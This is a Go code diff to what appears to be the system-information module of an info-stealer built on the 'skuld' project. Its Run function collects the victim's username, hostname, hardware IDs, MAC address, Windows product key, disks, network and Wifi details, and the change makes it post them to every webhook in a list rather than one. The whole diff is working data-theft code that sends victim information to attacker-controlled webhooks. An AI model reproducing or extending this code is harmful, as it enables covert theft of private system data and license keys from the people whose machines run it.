@@ -12,9 +12,9 @@ import (
 	"github.com/shirou/gopsutil/v3/disk"
 	"github.com/shirou/gopsutil/v3/mem"
 	"golang.org/x/sys/windows/registry"
-
 	"github.com/hackirby/skuld/utils/hardware"
 	"main.go/modules/requests"
+    "main.go/webhooks"
 )
 
 func GetOS() string {
@@ -194,40 +194,41 @@ func randString(n int) string {
 	return b.String()
 }
 
-func Run(webhook string) {
+func Run() {
 	users := strings.Join(hardware.GetUsers(), "\n")
 	if len(users) > 4096 {
 		users = "Too many users to display"
 	}
 
-	requests.Webhook(webhook, map[string]interface{}{
-		"embeds": []map[string]interface{}{
-			{
-				"title": "System Information",
-				"fields": []map[string]interface{}{
-					{
-						"name":  "User",
-						"value": fmt.Sprintf("```Username: %s\nHostname: %s\n```", os.Getenv("USERNAME"), os.Getenv("COMPUTERNAME")),
-					},
-					{
-						"name":  "System",
-						"value": fmt.Sprintf("```OS: %s\nCPU: %s\nGPU: %s\nRAM: %s\nMAC: %s\nHWID: %s\nProduct Key: %s```", GetOS(), GetCPU(), GetGPU(), GetRAM(), GetMAC(), GetHWID(), GetProductKey()),
-					},
-					{
-						"name":  "Disks",
-						"value": fmt.Sprintf("```%s```", GetDisks()),
-					},
-					{
-						"name":  "Network",
-						"value": fmt.Sprintf("```%s```", GetNetwork()),
-					},
-					{
-						"name":  "Wifi",
-						"value": fmt.Sprintf("```%s```", GetWifi()),
-					},
-				},
-			},
-		},
-	})
-
+    for _, webhook := range webhooks.Webhooks {
+    	requests.Webhook(webhook, map[string]interface{}{
+	    	"embeds": []map[string]interface{}{
+    			{
+    				"title": "System Information",
+    				"fields": []map[string]interface{}{
+    					{
+    						"name":  "User",
+    						"value": fmt.Sprintf("```Username: %s\nHostname: %s\n```", os.Getenv("USERNAME"), os.Getenv("COMPUTERNAME")),
+    					},
+    					{
+    						"name":  "System",
+    						"value": fmt.Sprintf("```OS: %s\nCPU: %s\nGPU: %s\nRAM: %s\nMAC: %s\nHWID: %s\nProduct Key: %s```", GetOS(), GetCPU(), GetGPU(), GetRAM(), GetMAC(), GetHWID(), GetProductKey()),
+       					},
+    					{
+	    					"name":  "Disks",
+		    				"value": fmt.Sprintf("```%s```", GetDisks()),
+			    		},
+    					{
+	    					"name":  "Network",
+		    				"value": fmt.Sprintf("```%s```", GetNetwork()),
+			    		},
+    					{
+	    					"name":  "Wifi",
+		    				"value": fmt.Sprintf("```%s```", GetWifi()),
+			    		},
+    				},
+    			},
+    		},
+    	})
+    }
 }
